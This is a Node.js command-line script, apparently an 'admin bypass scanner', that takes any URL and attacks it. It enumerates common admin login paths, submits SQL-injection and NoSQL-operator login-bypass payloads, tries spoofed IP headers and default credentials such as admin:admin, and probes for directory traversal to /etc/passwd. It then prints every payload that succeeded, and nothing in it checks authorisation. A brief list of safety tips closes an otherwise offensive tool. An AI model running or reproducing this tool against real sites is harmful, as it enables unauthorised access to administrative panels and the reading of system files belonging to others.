const axios = require('axios');
const cheerio = require('cheerio');
const chalk = require('chalk');
const cliProgress = require('cli-progress');
const FormData = require('form-data');

class AdminBypassScanner {
    constructor() {
        this.commonAdminPaths = [
            '/admin',
            '/administrator',
            '/wp-admin',
            '/login',
            '/admin/login',
            '/backend',
            '/panel',
            '/cpanel',
            '/webadmin',
            '/management',
            '/admincp',
            '/admin.php',
            '/admin.aspx',
            '/admin.jsp',
            '/admin.cgi',
            '/dashboard',
            '/admin_area',
            '/user/login',
            '/admin/login.php',
            '/admin/index.php'
        ];

        this.sqlInjectionPayloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "admin'--",
            "admin'#",
            "admin'/*",
            "' OR '1'='1'--",
            "' OR '1'='1'#",
            "' OR '1'='1'/*",
            "') OR ('1'='1",
            "admin' OR '1'='1",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT null,null--",
            "admin' OR 1=1--",
            "' OR 'a'='a",
            "' OR 1 --",
            "' OR '' = '",
            "' OR 1=1 LIMIT 1--",
            "admin' OR '1'='1'--"
        ];

        this.bypassPayloads = [
            "admin' OR '1'='1'-- -",
            "admin' OR 1=1#",
            "' OR 1=1-- -",
            "admin:admin",
            "admin:password",
            "admin:123456",
            "admin:admin123",
            "X-Forwarded-For: 127.0.0.1",
            "X-Originating-IP: 127.0.0.1",
            "X-Remote-IP: 127.0.0.1",
            "X-Remote-Addr: 127.0.0.1",
            '{"username":"admin", "password":{"$ne": ""}}',
            '{"username":"admin", "password":{"$gt": ""}}',
            '{"username":{"$ne": ""}, "password":{"$ne": ""}}'
        ];

        this.vulnerabilities = [];
        this.foundAdminPanels = [];
    }

    async scanWebsite(baseUrl) {
        console.log(chalk.blue(`\n Starting Admin Bypass & Vulnerability scan for: ${baseUrl}\n`));

        try {
            console.log(chalk.yellow('Looking for admin panel...'));
            await this.findAdminPanels(baseUrl);
            console.log(chalk.yellow('\n Testing SQL Injection on login forms...'));
            await this.testSQLInjection(baseUrl);
            console.log(chalk.yellow('\n Testing Authentication Bypass...'));
            await this.testAuthBypass(baseUrl);
            console.log(chalk.yellow('\n Scanning common vulnerabilities...'));
            await this.scanCommonVulns(baseUrl);
            this.displayResults();

        } catch (error) {
            console.log(chalk.red(`\nError: ${error.message}`));
        }
    }

    async findAdminPanels(baseUrl) {
        const progressBar = new cliProgress.SingleBar({
            format: 'Mencari Admin Panel |' + chalk.cyan('{bar}') + '| {percentage}% | {value}/{total} Paths',
            barCompleteChar: '\u2588',
            barIncompleteChar: '\u2591',
            hideCursor: true
        });

        progressBar.start(this.commonAdminPaths.length, 0);

        for (let i = 0; i < this.commonAdminPaths.length; i++) {
            const path = this.commonAdminPaths[i];
            const testUrl = baseUrl.endsWith('/') ? baseUrl + path.substring(1) : baseUrl + path;

            try {
                const response = await axios.get(testUrl, {
                    timeout: 8000,
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    },
                    validateStatus: null
                });

                if (response.status === 200 || response.status === 301 || response.status === 302) {
                    const $ = cheerio.load(response.data);
                    const pageTitle = $('title').text().toLowerCase();
                    const pageContent = response.data.toLowerCase();
                    if (pageTitle.includes('login') || pageTitle.includes('admin') || 
                        pageContent.includes('password') || pageContent.includes('username') ||
                        $('input[type="password"]').length > 0) {
                        
                        this.foundAdminPanels.push({
                            url: testUrl,
                            status: response.status,
                            title: pageTitle,
                            hasLoginForm: $('input[type="password"]').length > 0
                        });

                        console.log(chalk.green(`Found admin panel: ${testUrl}`));
                    }
                }

                progressBar.update(i + 1);
            } catch (error) {
               
            }
        }

        progressBar.stop();
    }

    async testSQLInjection(baseUrl) {
        for (const adminPanel of this.foundAdminPanels) {
            if (!adminPanel.hasLoginForm) continue;
            console.log(chalk.blue(`   Testing: ${adminPanel.url}`));
            const $ = await this.getPageContent(adminPanel.url);
            if (!$) continue;
            const forms = $('form');
            for (let formIndex = 0; formIndex < forms.length; formIndex++) {
                const form = $(forms[formIndex]);
                const formAction = form.attr('action');
                const formMethod = (form.attr('method') || 'get').toLowerCase();
                const targetUrl = formAction ? new URL(formAction, adminPanel.url).href : adminPanel.url;
                const usernameFields = form.find('input[name*="user"], input[name*="name"], input[type="text"], input[type="email"]');
                const passwordFields = form.find('input[type="password"]');
                if (usernameFields.length > 0 && passwordFields.length > 0) {
                    for (const payload of this.sqlInjectionPayloads) {
                        try {
                            const formData = {};
                            usernameFields.each((i, field) => {
                                const name = $(field).attr('name');
                                if (name) formData[name] = payload;
                            });

                            passwordFields.each((i, field) => {
                                const name = $(field).attr('name');
                                if (name) formData[name] = 'test';
                            });

                            form.find('input').each((i, field) => {
                                const name = $(field).attr('name');
                                const type = $(field).attr('type');
                                if (name && !formData[name] && type !== 'submit' && type !== 'button') {
                                    formData[name] = 'test';
                                }
                            });

                            let response;
                            if (formMethod === 'post') {
                                response = await axios.post(targetUrl, formData, {
                                    headers: {
                                        'Content-Type': 'application/x-www-form-urlencoded',
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                                    },
                                    timeout: 10000,
                                    validateStatus: null,
                                    maxRedirects: 5
                                });
                            } else {
                                const params = new URLSearchParams(formData);
                                response = await axios.get(`${targetUrl}?${params}`, {
                                    headers: {
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                                    },
                                    timeout: 10000,
                                    validateStatus: null,
                                    maxRedirects: 5
                                });
                            }

                            if (this.isBypassSuccessful(response)) {
                                this.vulnerabilities.push({
                                    type: 'SQL Injection',
                                    url: targetUrl,
                                    payload: payload,
                                    method: formMethod.toUpperCase(),
                                    severity: 'HIGH',
                                    description: 'SQL Injection successfully bypassed authentication'
                                });
                                console.log(chalk.red(`SQL Injection succeed: ${payload}`));
                                break;
                            }

                        } catch (error) {
                            continue;
                        }
                    }
                }
            }
        }
    }

    async testAuthBypass(baseUrl) {
        for (const adminPanel of this.foundAdminPanels) {
            console.log(chalk.blue(`   Testing auth bypass: ${adminPanel.url}`));
            const commonCredentials = [
                { username: 'admin', password: 'admin' },
                { username: 'admin', password: 'password' },
                { username: 'admin', password: '123456' },
                { username: 'administrator', password: 'administrator' },
                { username: 'root', password: 'root' },
                { username: 'test', password: 'test' }
            ];

            for (const creds of commonCredentials) {
                try {
                    const response = await axios.post(adminPanel.url, {
                        username: creds.username,
                        password: creds.password
                    }, {
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                        },
                        timeout: 10000,
                        validateStatus: null,
                        maxRedirects: 5
                    });

                    if (this.isBypassSuccessful(response)) {
                        this.vulnerabilities.push({
                            type: 'Weak Credentials',
                            url: adminPanel.url,
                            payload: `${creds.username}:${creds.password}`,
                            method: 'POST',
                            severity: 'MEDIUM',
                            description: 'Login successful with default credentials'
                        });
                        console.log(chalk.red(`Weak credentials successful: ${creds.username}:${creds.password}`));
                        break;
                    }
                } catch (error) {
                    continue;
                }
            }
        }
    }

    async scanCommonVulns(baseUrl) {
        const traversalPayloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '....//....//....//etc/passwd'
        ];

        for (const payload of traversalPayloads) {
            try {
                const response = await axios.get(`${baseUrl}/?file=${encodeURIComponent(payload)}`, {
                    timeout: 8000,
                    validateStatus: null
                });

                if (response.data.includes('root:') || response.data.includes('Administrator')) {
                    this.vulnerabilities.push({
                        type: 'Directory Traversal',
                        url: baseUrl,
                        payload: payload,
                        method: 'GET',
                        severity: 'HIGH',
                        description: 'Directory traversal vulnerability detected'
                    });
                    console.log(chalk.red(`Directory Traversal: ${payload}`));
                }
            } catch (error) {
                continue;
            }
        }
    }

    isBypassSuccessful(response) {
        const successfulIndicators = [
            'dashboard',
            'logout',
            'welcome',
            'admin panel',
            'manage',
            'location.href',
            '302 Found',
            'dashboard.php',
            'admin.php'
        ];

        const responseText = response.data.toLowerCase();
        const locationHeader = response.headers.location ? response.headers.location.toLowerCase() : '';
        return successfulIndicators.some(indicator => 
            responseText.includes(indicator) || locationHeader.includes(indicator)
        ) || response.status === 302;
    }

    async getPageContent(url) {
        try {
            const response = await axios.get(url, {
                timeout: 8000,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                validateStatus: null
            });
            return cheerio.load(response.data);
        } catch (error) {
            return null;
        }
    }

    displayResults() {
        console.log(chalk.green('\n' + '='.repeat(80)));
        console.log(chalk.green.bold('ADMIN BYPASS & VULNERABILITY SCAN RESULTS'));
        console.log(chalk.green('='.repeat(80)));
        if (this.foundAdminPanels.length > 0) {
            console.log(chalk.yellow.bold('\n ADMIN PANELS FOUND:'));
            this.foundAdminPanels.forEach((panel, index) => {
                console.log(chalk.white(`   ${index + 1}. ${panel.url}`));
                console.log(chalk.gray(`      Status: ${panel.status} | Login Form: ${panel.hasLoginForm ? 'Ya' : 'Tidak'}`));
            });
        }

        if (this.vulnerabilities.length === 0) {
            console.log(chalk.green('\n No exploitable vulnerabilities found'));
            return;
        }

        console.log(chalk.red.bold(`\n FOUND ${this.vulnerabilities.length} VULNERABILITY:\n`));
        this.vulnerabilities.forEach((vuln, index) => {
            console.log(chalk.red(`Vulnerability #${index + 1}:`));
            console.log(chalk.white(`   Tipe: ${vuln.type}`));
            console.log(chalk.white(`   URL: ${vuln.url}`));
            console.log(chalk.white(`   Method: ${vuln.method}`));
            console.log(chalk.yellow(`   Payload: ${vuln.payload}`));
            console.log(chalk.red(`   Severity: ${vuln.severity}`));
            console.log(chalk.white(`   Deskripsi: ${vuln.description}`));
            console.log(chalk.gray('   ──────────────────────────────────────────────────'));
        });

        console.log(chalk.blue('\n Safety Tips:'));
        console.log(chalk.blue('   - Use prepared statements for SQL'));
        console.log(chalk.blue('   - Implementing a strong password policy'));
        console.log(chalk.blue('   - Use rate limiting on login'));
        console.log(chalk.blue('   - Validate and sanitize all inputs'));
        console.log(chalk.blue('   - Use WAF (Web Application Firewall)'));
    }
}

async function main() {
    const readline = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });

    console.log(chalk.cyan(`
    ╔═══════════════════════════════════════════════╗
    ║           ADMIN BYPASS SCANNER               ║
    ║      SQL Injection & Vulnerability Scanner   ║
    ╚═══════════════════════════════════════════════╝
    `));

    console.log("Enter the URL of the website to be scanned:");
    readline.question('-> ', async (url) => {
        readline.close();
        if (!url.startsWith('http://') && !url.startsWith('https://')) {
            url = 'http://' + url;
        }

        const scanner = new AdminBypassScanner();
        await scanner.scanWebsite(url);
    });
}

    main().catch(console.error);
